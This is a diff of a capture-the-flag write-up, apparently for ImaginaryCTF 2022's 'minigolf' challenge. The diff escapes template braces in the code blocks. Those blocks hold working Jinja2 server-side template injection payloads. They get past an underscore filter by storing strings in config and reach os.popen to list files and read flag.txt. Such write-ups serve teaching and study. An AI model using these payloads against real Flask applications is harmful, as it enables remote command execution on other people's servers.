@@ -650,7 +650,7 @@ So, we can do everything we normally do, only, it costs us a few extra character
 For example,
 
 ```
-\{%print(config.items())%}
+\{%print(config.items())%\}
 ```
 
 Now, we just need to somehow make a payload to read the flag with less than 69
@@ -668,14 +668,14 @@ children or attributes pretty easily. So, I went forward with trying to get the
 payload from SSTI Golf injected into this challenge.
 
 ```
-{%print(config.update(a=request.args.a))}&a=__globals__
+\{%print(config.update(a=request.args.a))%\}&a=__globals__
 ```
 
 First, I needed to get access to globals. However, with the blacklist restrictions
 underscores are blocked. So, to get access to it I added the string to the config.
 
 ```
-{%print(config.update(b=lipsum|attr(config.a)))}
+\{%print(config.update(b=lipsum|attr(config.a)))%\}
 ```
 
 Next, I added the `lipsum.__globals__` object to the config so I could easily
@@ -693,8 +693,8 @@ commands without causing an error. So, we also have to add our commands to the
 config to avoid this.
 
 ```
-{%print(config.update(c=request.args.c))%}&c=ls
-{%print(config.b.os.popen(config.c).read())%}
+\{%print(config.update(c=request.args.c))%\}&c=ls
+\{%print(config.b.os.popen(config.c).read())%\}
 ```
 
 [![Directory listing](/assets/ICTF-2022/mini1.png)](/assets/ICTF-2022/mini1.png)
@@ -706,8 +706,8 @@ This time the flag has a very simple name. The final step is to add a cat comman
 to the config and send our final payload.
 
 ```
-{%print(config.update(d=request.args.d))%}&d=cat%20flag.txt
-{%print(config.b.os.popen(config.d).read())%}
+\{%print(config.update(d=request.args.d))%\}&d=cat%20flag.txt
+\{%print(config.b.os.popen(config.d).read())%\}
 ```
 
 [![The minigolf flag printed](/assets/ICTF-2022/mini2.png)](/assets/ICTF-2022/mini2.png)
